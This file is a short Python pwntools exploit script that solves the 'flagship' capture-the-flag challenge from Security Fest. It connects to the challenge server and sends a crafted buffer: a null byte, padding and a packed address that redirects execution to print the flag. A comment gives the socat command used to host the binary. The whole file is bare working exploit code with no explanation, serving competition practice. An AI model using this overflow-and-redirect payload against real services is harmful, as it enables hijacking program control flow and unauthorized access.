#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# socat -d -d TCP-LISTEN:1337,fork EXEC:"./flagship"
#

from pwn import *

HOST = 'pwn2.securityfest.ctf.rocks'
PORT = 1337

def main():
  sock = remote(HOST, PORT)
  sock.recvuntil("CONTINUE: ")
  sock.sendline("TEST\x00AAA" + "A"*16 + p32(0x400983))
  print "Flag: %s" % sock.recvuntil("\n")

if __name__ == '__main__':
  main()